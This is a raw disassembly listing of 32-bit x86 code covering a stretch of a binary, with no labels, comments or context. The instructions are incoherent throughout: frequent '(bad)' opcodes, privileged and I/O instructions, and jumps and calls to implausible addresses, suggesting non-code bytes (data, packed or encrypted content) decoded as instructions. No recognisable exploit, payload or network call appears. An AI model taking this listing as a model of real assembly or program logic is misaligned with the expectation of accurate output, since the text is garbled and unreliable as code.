  432e29:	add    cl,bh
  432e2b:	mov    edi,DWORD PTR [ebp+0x8]
  432e2e:	mov    DWORD PTR [ebp-0x14],esi
  432e31:	add    esi,DWORD PTR [ebp+0x3c]
  432e34:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432e3a:	mov    ah,0x3d
  432e3c:	cdq    
  432e3d:	pushf  
  432e3e:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432e44:	jne    0x432dd1
  432e46:	mov    ecx,DWORD PTR [esp+ebp*8]
  432e49:	icebp  
  432e4a:	icebp  
  432e4b:	shl    edx,0xf2
  432e4e:	(bad)  
  432e4f:	mov    ah,0x16
  432e51:	inc    eax
  432e52:	jne    0x432de7
  432e54:	mov    ecx,DWORD PTR [edi]
  432e56:	in     al,dx
  432e57:	jmp    0x432e4a
  432e59:	add    dl,dh
  432e5b:	mov    edi,esi
  432e5d:	or     al,0x8
  432e5f:	inc    ebp
  432e60:	jne    0x432e65
  432e62:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432e68:	ret    
  432e69:	or     bh,bh
  432e6b:	jge    0x432e55
  432e6d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432e73:	xor    edi,eax
  432e75:	add    esi,DWORD PTR [ebp-0x77]
  432e78:	mov    ebx,esp
  432e7a:	clc    
  432e7b:	neg    DWORD PTR [ebp-0x7c]
  432e7e:	xor    eax,DWORD PTR [eax]
  432e80:	cmp    eax,DWORD PTR [eax]
  432e82:	repz jne 0x432e1a
  432e85:	xor    eax,DWORD PTR [ecx]
  432e87:	add    ebx,DWORD PTR [eax]
  432e89:	mov    DWORD PTR [ebp-0x8],eax
  432e8c:	mov    eax,edi
  432e8e:	cld    
  432e8f:	lock pop eax
  432e91:	test   DWORD PTR [ebx],esi
  432e93:	clc    
  432e94:	add    edx,DWORD PTR [edi-0x740bff77]
  432e9a:	fdivp  st(4),st
  432e9c:	test   ecx,esi
  432e9e:	(bad)  
  432e9f:	jnp    0x432ea0
  432ea1:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432ea7:	jae    0x432e34
  432ea9:	sub    edi,esp
  432eab:	(bad)  
  432eac:	shl    DWORD PTR [eax-0x3e],0x89
  432eb0:	leave  
  432eb1:	call   0x8198e5be
  432eb6:	in     al,dx
  432eb7:	(bad)  
  432eb8:	in     al,dx
  432eb9:	add    bh,al
  432ebb:	mov    esp,edi
  432ebd:	in     al,dx
  432ebe:	test   DWORD PTR [ebp-0x8],edi
  432ec1:	mov    eax,DWORD PTR [ebp+0x2b]
  432ec4:	cmp    DWORD PTR [ebx],eax
  432ec6:	pushf  
  432ec7:	jnp    0x57322b00
  432ecd:	xor    edx,DWORD PTR [ecx-0x77]
  432ed0:	push   ecx
  432ed1:	loopne 0x432f06
  432ed3:	jne    0x432e90
  432ed5:	mov    esi,DWORD PTR [edx-0x20]
  432ed8:	add    BYTE PTR [ebp-0x3d],bh
  432edb:	xor    eax,DWORD PTR [ebp-0x73]
  432ede:	mov    edi,DWORD PTR [esi]
  432ee0:	cld    
  432ee1:	jb     0x432ea9
  432ee3:	add    bl,al
  432ee5:	jne    0x432f2c
  432ee7:	mov    edx,DWORD PTR [edi-0x10]
  432eea:	jge    0x432f69
  432eec:	mov    esi,DWORD PTR [ebx]
  432eee:	lock add ecx,DWORD PTR [ebp+0x3b]
  432ef2:	xor    esi,DWORD PTR [ebp-0x77]
  432ef5:	mov    esi,eax
  432ef7:	lock inc ebp
  432ef9:	jge    0x432f31
  432efb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432f02:	dec    ebp
  432f03:	mov    esi,DWORD PTR [ebx]
  432f05:	loopne 0x432e90
  432f07:	jge    0x432f01
  432f09:	add    DWORD PTR [ebp-0x7d],eax
  432f0c:	test   BYTE PTR [edx],0x9c
  432f0f:	dec    ebp
  432f10:	mov    esi,DWORD PTR [ebp-0xc]
  432f13:	mov    ecx,DWORD PTR [ebp-0xc]
  432f16:	xor    ebx,DWORD PTR [ebp-0x77]
  432f19:	mov    esi,esp
  432f1b:	in     al,0x45
  432f1d:	jge    0x432f59
  432f1f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432f26:	dec    ebp
  432f27:	inc    esp
  432f28:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432f2e:	inc    ebp
  432f2f:	hlt    
  432f30:	ss jne 0x432ed2
  432f33:	mov    edi,DWORD PTR [eax+0xf19504]
  432f39:	repnz mov DWORD PTR [ebp+0x20],ebx
  432f3d:	cmp    eax,DWORD PTR [ebp+0xf]
  432f40:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432f44:	fistp  WORD PTR [ebx+0x0]
  432f47:	inc    ebp
  432f48:	mov    ebx,DWORD PTR [edi+0xc]
  432f4b:	add    eax,eax
  432f4d:	inc    ebp
  432f4e:	test   BYTE PTR [ebx],dh
  432f50:	add    eax,DWORD PTR [ebx]
  432f52:	add    BYTE PTR [esi+0x45],bl
  432f55:	ret    0x85
  432f58:	jnp    0x5443b327
  432f5e:	inc    bp
  432f60:	inc    ebp
  432f61:	ss mov ecx,0xc78a9c
  432f67:	fdiv   QWORD PTR [ebx]
  432f69:	test   DWORD PTR [ecx+0x453af8],edi
  432f6f:	push   ebx
  432f70:	add    edi,DWORD PTR [esi+0x708088b]
  432f76:	cmp    esi,eax
  432f78:	setns  BYTE PTR [ecx-0x74fcffce]
  432f7f:	mov    esp,edi
  432f81:	call   0x33ce74d3
  432f86:	or     BYTE PTR [ebx],al
  432f88:	inc    ecx
  432f89:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432f8f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432f95:	lock add cl,al
  432f98:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432f9f:	mov    ch,0x45
  432fa1:	clc    
  432fa2:	xor    eax,DWORD PTR [ebp+0x3]
  432fa5:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432fab:	inc    ebp
  432fac:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432fb2:	mov    edi,eax
  432fb4:	mov    eax,DWORD PTR [ebp+0x3c]
  432fb7:	mov    ecx,DWORD PTR [eax]
  432fb9:	hlt    
  432fba:	inc    ebp
  432fbb:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432fc2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432fc8:	push   ebp
  432fc9:	mov    edi,DWORD PTR [ebx]
  432fcb:	in     al,dx
  432fcc:	jne    0x432f8f
  432fce:	mov    eax,DWORD PTR [ebp-0x28]
  432fd1:	add    DWORD PTR [eax],0xe8058dec
  432fd7:	clc    
  432fd8:	mov    esi,DWORD PTR [edi-0x8]
  432fdb:	add    dh,dl
  432fdd:	rol    WORD PTR [ebp-0x1],cl
  432fe1:	mov    edx,DWORD PTR [eax+0x8]
  432fe4:	jne    0x432fa6
  432fe6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432fed:	inc    ebp
  432fee:	push   esp
  432fef:	test   DWORD PTR [ecx+0xf],ecx
  432ff2:	sub    edx,esp
  432ff4:	add    eax,DWORD PTR [eax]
  432ff6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432ffc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  433003:	mov    eax,DWORD PTR [ecx]
  433005:	and    BYTE PTR [eax],al
  433007:	cmp    BYTE PTR [eax],dl
  433009:	add    BYTE PTR [ebp+0x66],al
  43300c:	inc    ecx
  43300e:	push   esp
  43300f:	(bad)  
  433010:	jne    0x433012
  433012:	push   edx
  433013:	enterw 0xc1,0x4d
  433018:	mov    esp,DWORD PTR [esi+0x20]
  43301b:	add    DWORD PTR [ecx-0x7b],eax
  43301e:	add    eax,DWORD PTR [ebx]
  433020:	str    WORD PTR [eax+0x45]
  433024:	lea    ecx,[ebx+0x45890801]
  43302a:	sbb    BYTE PTR [ebx],al
  43302c:	dec    ebp
  43302d:	cmp    al,0xf
  43302f:	inc    ebp
  433030:	push   eax
  433031:	mov    esi,DWORD PTR [ebx]
  433033:	push   eax
  433034:	add    eax,eax
  433036:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43303d:	inc    ebp
  43303e:	add    BYTE PTR [esi],dh
  433040:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  433047:	(bad)  
  433048:	mov    ebx,eax
  43304a:	loopne 0x433091
  43304c:	dec    ebp
  43304d:	mov    ecx,DWORD PTR [edi]
  43304f:	cld    
  433050:	push   eax
  433051:	xchg   DWORD PTR [ebx],esi
  433053:	add    DWORD PTR [ebx],ebp
  433055:	add    BYTE PTR [ebx],ch
  433057:	or     BYTE PTR [ecx],bh
  433059:	dec    ecx
  43305a:	loopne 0x43305f
  43305c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  433062:	push   ebp
  433063:	add    DWORD PTR [ebx+0x55100800],eax
  433069:	dec    ebp
  43306a:	jmp    0x432ff5
  43306c:	mov    esp,DWORD PTR [eax]
  43306e:	sbb    dl,dl
  433070:	inc    eax
  433071:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  433077:	add    BYTE PTR [ebx+0x74528555],cl
  43307d:	push   ebp
  43307e:	div    DWORD PTR [ebx]
  433080:	and    eax,DWORD PTR [ebx]
  433082:	add    edx,DWORD PTR [edx-0x30]
  433085:	jno    0x433012
  433087:	inc    DWORD PTR [eax+eiz*1]
  43308a:	inc    ebp
  43308b:	push   eax
  43308c:	push   eax
  43308d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  433093:	mov    edi,esp
  433095:	push   eax
  433096:	inc    ebp
  433097:	enter  0x458b,0x8
  43309b:	push   ecx
  43309c:	(bad)  
  43309d:	call   0x10d3a75
  4330a2:	pop    ss
  4330a3:	push   ebp
  4330a4:	mov    ecx,DWORD PTR [ebx+0x489408]
  4330aa:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4330b0:	push   ecx
  4330b1:	jo     0x43309b
  4330b3:	inc    DWORD PTR [edi]
  4330b5:	or     BYTE PTR [eax],al
  4330b7:	call   0xce3801
  4330bc:	fmul   QWORD PTR [ebp+0x55]
  4330bf:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4330c5:	mov    bh,0x8c
  4330c7:	adc    al,0x99
  4330c9:	dec    esp
  4330ca:	xor    bl,BYTE PTR [eax]
  4330cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4330cf:	mov    eax,DWORD PTR [ebp-0x4]
  4330d2:	mov    esi,DWORD PTR [edi-0x3148f924]
  4330d8:	push   es
  4330d9:	retf   
  4330da:	mov    BYTE PTR [ebp-0x30],0x3b
  4330de:	inc    ebp
  4330df:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4330e6:	retf   0x83fc
  4330e9:	into   
  4330ea:	dec    ebp
  4330eb:	retf   
  4330ec:	mov    ecx,DWORD PTR [ebp-0x74]
  4330ef:	mov    eax,DWORD PTR [eax]
  4330f1:	fdiv   QWORD PTR [ebx]
  4330f3:	mov    bh,0x3
  4330f5:	push   es
  4330f6:	mov    esi,ecx
  4330f8:	sbb    cl,dl
  4330fa:	dec    ebp
  4330fb:	sar    DWORD PTR [ebx],cl
  4330fd:	push   ebp
  4330fe:	jne    0x43310f
  433100:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  433106:	lea    ebx,[eax]
  433108:	call   0xf4ccbccf
  43310d:	sbb    dh,dl
  43310f:	add    edx,ebx
  433111:	push   ebp
  433112:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  433118:	push   ecx
  433119:	mov    DWORD PTR [eax-0x30],edx
  43311c:	test   DWORD PTR [edx],eax
  43311e:	xadd   esp,esi
  433121:	pop    es
  433122:	add    cl,dl
  433124:	mov    eax,ecx
  433126:	or     al,0x45
  433128:	(bad)  
  433129:	push   eax
  43312a:	add    DWORD PTR [edx+0x0],eax
  43312d:	add    ecx,DWORD PTR [ecx]
  43312f:	and    dh,cl
  433131:	call   0xc73a01
  433136:	add    DWORD PTR [ebp+0x0],edx
  433139:	mov    esp,DWORD PTR [ebp+0x18]
  43313c:	add    BYTE PTR [eax+0x48],cl
  43313f:	xor    eax,DWORD PTR [eax]
  433141:	add    esp,DWORD PTR [esi+0x3b]
  433144:	inc    ebp
  433145:	je     0x4330ca
  433147:	push   ecx
  433148:	push   es
  433149:	dec    ebp
  43314a:	mov    DWORD PTR [ebx],eax
  43314c:	(bad)  
  43314d:	or     al,0x5e
  43314f:	inc    eax
  433150:	add    BYTE PTR [ebx],al
  433152:	data16 and BYTE PTR [ebp+0x50],al
  433156:	sub    DWORD PTR [ecx],0xfffffff8
  433159:	add    BYTE PTR [ebp-0x75],ah
  43315c:	add    BYTE PTR [eax],bl
  43315e:	enter  0x894d,0x8b
  433162:	int3   
  433163:	loopne 0x43319f
  433165:	rol    BYTE PTR [eax],0x33
  433168:	lea    cx,[ebp+0xa]
  43316c:	data16 jb 0x4331b4
  43316f:	add    BYTE PTR [ebx+0x44890855],cl
  433175:	sbb    ah,al
  433177:	inc    ebp
  433178:	cmp    BYTE PTR [edi],cl
  43317a:	add    BYTE PTR [edx+0x66],dl
  43317d:	xor    ecx,DWORD PTR [eax]
  43317f:	sub    edi,esi
  433181:	mov    eax,DWORD PTR [eax]
  433183:	or     al,0x66
  433185:	ror    edx,cl
  433187:	dec    ebp
  433188:	inc    ebp
  433189:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43318f:	cld    
  433190:	or     BYTE PTR [edi+0x4501dd],dl
  433196:	ret    0xe8ce
  433199:	retf   
  43319a:	(bad)  
  43319b:	dec    ebp
  43319c:	mov    al,0x8b
  43319e:	in     al,dx
  43319f:	and    BYTE PTR [ebx],bh
  4331a1:	or     al,BYTE PTR [ebp+0x27]
  4331a4:	in     al,dx
  4331a5:	xchg   eax,ebp
  4331a7:	add    edi,eax
  4331a9:	add    BYTE PTR [eax+0x3f52ed55],bh
  4331af:	push   ebp
  4331b0:	inc    ebp
  4331b1:	xor    ebx,edx
  4331b3:	add    ebp,eax
  4331b5:	push   edx
  4331b6:	push   bp
  4331b8:	inc    ebp
  4331b9:	(bad)  
  4331ba:	jmp    0xc342f813
  4331bf:	sbb    al,0x33
  4331c1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4331c8:	add    BYTE PTR [ebp+0x44],0x8b
  4331cc:	jmp    0xf98b:0x100041c8
  4331d3:	xor    esi,DWORD PTR [edx+0x3]
  4331d6:	mov    ecx,DWORD PTR [edi]
  4331d8:	fmul   DWORD PTR [edx]
  4331da:	add    BYTE PTR [eax],al
  4331dc:	lea    eax,[ebx-0x4700273c]
  4331e2:	add    al,0x4f
  4331e4:	pop    DWORD PTR [eax]
  4331e6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4331ec:	push   edx
  4331ed:	inc    WORD PTR [ebp+0x8]
  4331f1:	mov    eax,0x514f4d
  4331f6:	(bad)
  4331fa:	add    al,al
  4331fc:	xor    DWORD PTR [ebx-0x74baf730],eax
  433202:	test   DWORD PTR [esi+0x74],esp
  433205:	inc    ebp
  433206:	mov    DWORD PTR [eax+0xa4f08],edi
  43320c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433212:	or     dh,cl
  433214:	or     eax,0x8b8d5045
  433219:	inc    ebp
  43321a:	mov    WORD PTR [ecx+0x3b8a00],?
  433220:	jne    0x433255
  433222:	mov    edi,DWORD PTR [edx+0x8f3a18]
  433228:	add    DWORD PTR [ebx],eax
  43322a:	add    bh,bh
  43322c:	adc    DWORD PTR [eax],ecx
  43322e:	adc    DWORD PTR [ebp+0x55],edi
  433231:	push   es
  433232:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  433238:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  43323f:	inc    ebp
  433240:	mov    esp,edi
  433242:	or     al,0xda
  433244:	push   eax
  433245:	(bad)  
  433246:	jne    0x4331fc
  433248:	call   0x3b2b37
  43324d:	inc    ebp
  43324e:	rol    ah,0x84
  433251:	call   0xbc43f956
  433256:	jne    0x433232
  433258:	mov    ebx,ebx
  43325a:	inc    edi
  43325c:	and    al,al
  43325e:	fs jmp 0x7ec87863
  433264:	bswap  ecx
  433266:	scas   al,BYTE PTR es:[edi]
  433267:	inc    esp
  433268:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43326f:	or     BYTE PTR [ebx-0x97717c6],0x83
  433276:	call   DWORD PTR [edi]
  433278:	shr    ah,0x84
  43327b:	xchg   DWORD PTR [eax],eax
  43327d:	add    DWORD PTR [eax],eax
  43327f:	add    bh,bh
  433281:	dec    ebp
  433282:	and    BYTE PTR [ecx-0x38],dl
  433285:	push   eax
  433286:	dec    DWORD PTR [ebx+0xfd885]
  43328c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433292:	mov    WORD PTR [ecx+0x0],ss
  433295:	lea    ecx,[ebx+0x108b20d8]
  43329b:	mov    WORD PTR [edx],ds
  43329d:	add    BYTE PTR [edi+0xff01ff],al
  4332a3:	mov    ecx,DWORD PTR [ebp-0x28]
  4332a6:	push   ecx
  4332a7:	shl    BYTE PTR [ebp+0x3a],0x8b
  4332ab:	inc    ebp
  4332ac:	in     al,0xeb
  4332ae:	jno    0x43323b
  4332b0:	push   edx
  4332b1:	mov    DWORD PTR [eax-0x28],edx
  4332b4:	mov    eax,DWORD PTR [ebp+0x20]
  4332b7:	je     0x433240
  4332b9:	mov    eax,DWORD PTR [ecx]
  4332bb:	sbb    BYTE PTR [eax],al
  4332bd:	pop    DWORD PTR [eax]
  4332bf:	add    esi,eax
  4332c1:	add    bl,al
  4332c3:	adc    DWORD PTR [edi],esi
  4332c5:	jmp    0x8bce8317
  4332ca:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  4332d1:	jne    0x43325e
  4332d3:	mov    ecx,DWORD PTR [eax]
  4332d5:	in     al,0x75
  4332d7:	pop    DWORD PTR [ecx+0x5101]
  4332dd:	push   edx
  4332de:	inc    DWORD PTR [ebx]
  4332e0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4332e6:	add    BYTE PTR [edi+0x9],dl
  4332e9:	call   DWORD PTR [esi]
  4332eb:	and    dl,al
  4332ed:	and    bh,bh
  4332ef:	inc    edi
  4332f1:	test   eax,edx
  4332f3:	sldt   ebx
  4332f6:	cmp    DWORD PTR [eax],eax
  4332f8:	pushf  
  4332f9:	(bad)  
  4332fa:	jmp    0x433308
  4332fc:	mov    eax,edi
  4332fe:	or     al,0x75
  433300:	inc    eax
  433301:	call   0x432a09
  433306:	mov    eax,eax
  433308:	loopne 0x43328e
  43330a:	inc    ebp
  43330b:	add    BYTE PTR [ebx+0x1451c00],cl
  433311:	mov    eax,DWORD PTR [ebp+0x20]
  433314:	add    edi,ecx
  433316:	add    BYTE PTR [eax],ch
  433318:	cmp    edi,0x18
  43331b:	test   DWORD PTR [ebp+0xf],esi
  43331e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  433325:	jne    0x433329
  433327:	call   0xffa22dec
  43332c:	leave  
  43332d:	rcr    BYTE PTR [esp+eax*4],0x55
  433331:	add    ah,ch
  433333:	add    BYTE PTR [edi-0x48fef979],dh
  433339:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  433340:	inc    esp
  433341:	mov    ebx,DWORD PTR [eax]
  433343:	fcom   st(2)
  433345:	add    BYTE PTR [edi],bl
  433347:	lea    ecx,[eax-0x18]
  43334a:	(bad)  
  43334b:	push   DWORD PTR [ecx]
  43334d:	call   0xffb580af
  433352:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  433356:	fstp   DWORD PTR [esi+ebx*8]
  433359:	push   ebp
  43335a:	pop    ebp
  43335b:	mov    esi,DWORD PTR [edx-0x38]
  43335e:	add    DWORD PTR [eax],0x28
  433361:	mov    edi,DWORD PTR [ebx]
  433363:	xor    esi,DWORD PTR [edx+0x3]
  433366:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43336a:	pop    ebp
  43336b:	or     al,0x4
  43336d:	inc    ecx
  43336e:	push   ebp
  43336f:	(bad)  
  433370:	in     al,dx
  433371:	or     ah,ch
  433373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433374:	xbegin 0xffc8a96a
  43337a:	clc    
  43337b:	adc    al,0x45
  43337d:	idiv   BYTE PTR [ecx]
  43337f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433386:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43338c:	add    BYTE PTR [ecx+0x66],dh
  43338f:	add    eax,DWORD PTR [ebp+0x52]
  433392:	adc    eax,0x20
  433395:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43339b:	test   DWORD PTR [eax],eax
  43339d:	clc    
  43339e:	data16 or al,BYTE PTR [ebp+0x45]
  4333a2:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4333a9:	rol    BYTE PTR [ebp+0x45],1
  4333ac:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4333b2:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4333b8:	push   ebx
  4333b9:	add    BYTE PTR [ecx+0x0],dl
  4333bc:	push   ecx
  4333bd:	jge    0x4333f2
  4333bf:	add    BYTE PTR [esi+0x4],dl
  4333c2:	jne    0x433429
  4333c4:	mov    edx,0x457200
  4333c9:	jmp    0x43338d
  4333cb:	xor    edi,DWORD PTR [ebx]
  4333cd:	pop    edi
  4333ce:	cvtdq2ps xmm7,xmm0
  4333d1:	ret    0x0
  4333d4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4333da:	xor    ecx,DWORD PTR [edi]
  4333dc:	add    eax,DWORD PTR [ecx+0x3b]
  4333df:	push   ebx
  4333e0:	rdpmc  
  4333e2:	out    0x8d,al
  4333e4:	add    BYTE PTR [eax],cl
  4333e6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4333ec:	ret    0x450c
  4333ef:	sbb    al,0x8b
  4333f1:	cmp    eax,esi
  4333f3:	or     cl,al
  4333f5:	or     al,0xc2
  4333f7:	pop    eax
  4333f8:	inc    ebp
  4333f9:	add    ecx,DWORD PTR [edi]
  4333fb:	add    esi,DWORD PTR [ebp+0x39]
  4333fe:	invd   
  433400:	jge    0x43340c
  433402:	mov    eax,0x478ac0
  433407:	cli    
  433408:	xor    esp,ecx
  43340a:	mov    ebx,0x5b8ac0
  43340f:	ret    0x33
  433412:	mov    eax,0x833a8b
  433417:	sub    BYTE PTR [ebx],al
  433419:	inc    ebp
  43341a:	data16 ss clc 
  43341d:	pushf  
  43341e:	inc    bh
  433420:	mov    esp,esp
  433422:	hlt    
  433423:	test   DWORD PTR [ebp-0x8],esi
  433426:	mov    eax,DWORD PTR [ebp-0x14]
  433429:	cmp    BYTE PTR [ebx-0x76478864],cl
  43342f:	dec    edi
  433430:	or     BYTE PTR [eax],al
  433432:	jne    0x4333bd
  433434:	mov    esi,esp
  433436:	call   0x77a9bffb
  43343b:	inc    ebp
  43343c:	mov    DWORD PTR [eax+0x994f0c],edi
  433442:	add    BYTE PTR [ecx-0x3ffe0717],cl
  433448:	add    BYTE PTR [esi+0x7d],ah
  43344b:	inc    ebp
  43344c:	mov    bx,WORD PTR [ebp+0x8]
  433450:	add    DWORD PTR [ebp+0x51],0x30c008b
  433457:	inc    ebp
  433458:	mov    bx,di
  43345b:	lock test BYTE PTR [ecx+0x7000801],bh
  433462:	jge    0x433425
  433464:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  43346a:	cli    
  43346b:	xor    bl,bh
  43346d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  433473:	test   BYTE PTR [eax],cl
  433475:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43347c:	cmp    ebp,eax
  43347e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433485:	test   BYTE PTR [ebp+0x1],bh
  433488:	mov    ebx,0x458a00
  43348d:	xor    esi,DWORD PTR [ebx]
  43348f:	add    esp,DWORD PTR [esi-0x77]
  433492:	pop    ebp
  433493:	loopne 0x4334fb
  433495:	inc    ebp
  433496:	clc    
  433497:	xor    edi,DWORD PTR [ebx]
  433499:	add    esi,DWORD PTR [edx-0x77]
  43349c:	data16 fdivr QWORD PTR [ebp-0x49]
  4334a0:	mov    ebx,0xb78afc
  4334a5:	hlt    
  4334a6:	xor    edi,DWORD PTR [eax]
  4334a8:	data16 add BYTE PTR [ebp+0x66],bl
  4334ac:	data16 lock clc 
  4334af:	cmp    BYTE PTR [ebx],bh
  4334b1:	add    BYTE PTR [edi+0x66],dh
  4334b4:	psubq  mm7,QWORD PTR [ebp-0x2]
  4334b8:	ltr    WORD PTR [ebp+0x66]
  4334bc:	add    esi,eax
  4334be:	add    di,WORD PTR [ebp+0x2b]
  4334c2:	data16 data16 jge 0x433543
  4334c6:	mov    ebx,0xe08a8b
  4334cb:	jge    0x433500
  4334cd:	data16 data16 xor al,0x5d
  4334d1:	data16 data16 jne 0x4334cd
  4334d5:	mov    edi,DWORD PTR [ebx]
  4334d7:	fdiv   QWORD PTR [edx+0x7d]
  4334da:	data16 data16 jge 0x433512
  4334de:	mov    ebx,0x758a66
  4334e3:	mov    esi,0x667233
  4334e8:	pop    ebp
  4334e9:	or     BYTE PTR [esi+0x0],ah
  4334ec:	clc    
  4334ed:	mov    edi,DWORD PTR [ebx]
  4334ef:	lock ja 0x43347d
  4334f2:	(bad)  
  4334f4:	jge    0x4334ed
  4334f6:	invd   
  4334f8:	pop    ebp
  4334f9:	add    BYTE PTR [ebx],al
  4334fb:	(bad)  
  4334fc:	cmp    di,WORD PTR [ebp+0xf]
  433500:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433504:	mov    bx,WORD PTR [ebp-0x10]
  433508:	pop    bp
  43350a:	fbstp  TBYTE PTR [ebx]
  43350c:	test   DWORD PTR [ebx],eax
  43350e:	add    BYTE PTR [ebx],bh
  433510:	add    BYTE PTR [esi+0x7d],ah
  433513:	jge    0x4334a0
  433515:	data16 in al,dx
  433517:	pop    ebp
  433518:	stc    
  433519:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  433520:	mov    edi,ebx
  433522:	in     al,dx
  433523:	test   BYTE PTR [ebp+0x0],bh
  433526:	mov    eax,DWORD PTR [eax]
  433528:	call   0xbd402eb8
  43352d:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  433533:	sti    
  433534:	call   0x8b4bb2c4
  433539:	add    ebp,esp
  43353b:	mov    bx,di
  43353e:	jnp    0x433566
  433540:	mov    DWORD PTR [ebx+0x387df808],ecx
  433546:	mov    eax,DWORD PTR [eax]
  433548:	call   0x7c3ec0b3
  43354d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  433553:	data16 data16 fistp WORD PTR [ebp+0xe]
  433558:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  433562:	fisttp WORD PTR [ecx-0x7401f77b]
  433568:	(bad)  
  433569:	cld    
  43356a:	jne    0x4335a4
  43356c:	xor    eax,DWORD PTR [eax]
  43356e:	mov    esp,DWORD PTR [esi-0x10]
  433571:	sti    
  433572:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  433579:	data16 adc bl,bh
  43357c:	push   ebp
  43357d:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433584:	mov    WORD PTR [eax],es
  433586:	cdq    
  433587:	data16 xor bh,bl
  43358a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433590:	mov    esp,DWORD PTR [esi-0x14]
  433593:	fisttp WORD PTR [ebx-0x3748a9f2]
  433599:	or     al,0x2b
  43359b:	mov    bh,0xba
  43359d:	hlt    
  43359e:	mov    bh,bl
  4335a0:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4335a6:	dec    edi
  4335a7:	or     al,0x0
  4335a9:	mov    edi,DWORD PTR [ebx]
  4335ab:	or     BYTE PTR [ebp+0x3b],dh
  4335ae:	mov    ecx,DWORD PTR [edi]
  4335b0:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4335b6:	xor    al,0xd8
  4335b8:	pop    bp
  4335ba:	lock xor esi,DWORD PTR [ebx]
  4335bd:	lea    esp,[esi+0x1f]
  4335c0:	icebp  
  4335c1:	jb     0x4335c7
  4335c3:	add    al,al
  4335c5:	jge    0x4335d3
  4335c7:	mov    eax,eax
  4335c9:	fsubr  st,st(3)
  4335cb:	pop    ebp
  4335cc:	mov    esi,DWORD PTR [ebx]
  4335ce:	in     al,0x8d
  4335d0:	rcr    DWORD PTR [edi],0xc2
  4335d3:	jb     0x433633
  4335d5:	add    cl,cl
  4335d7:	jge    0x4335e5
  4335d9:	mov    edx,DWORD PTR [ebp-0x20]
  4335dc:	in     al,dx
  4335dd:	pop    ebp
  4335de:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4335e3:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4335e7:	mov    ebp,DWORD PTR [ebx]
  4335e9:	fdivr  QWORD PTR [esi+0x668a5d]
  4335ef:	cmp    al,0x33
  4335f1:	mov    si,0x4f7d
  4335f5:	mov    eax,DWORD PTR [eax]
  4335f7:	lock inc ebp
  4335f9:	mov    esi,DWORD PTR [edi]
  4335fb:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433602:	clc    
  433603:	(bad)  
  433604:	cmp    edi,DWORD PTR [ebx]
  433606:	je     0x433617
  433608:	push   ebx
  433609:	loopne 0x43361a
  43360b:	dec    ecx
  43360d:	mov    esp,DWORD PTR [edi-0x1c]
  433610:	int    0xf1
  433612:	mov    esi,0x703084d
  433617:	pcmpgtd mm6,mm1
  43361a:	add    BYTE PTR [ebp+0x66],dh
  43361d:	jmp    0x4335ea
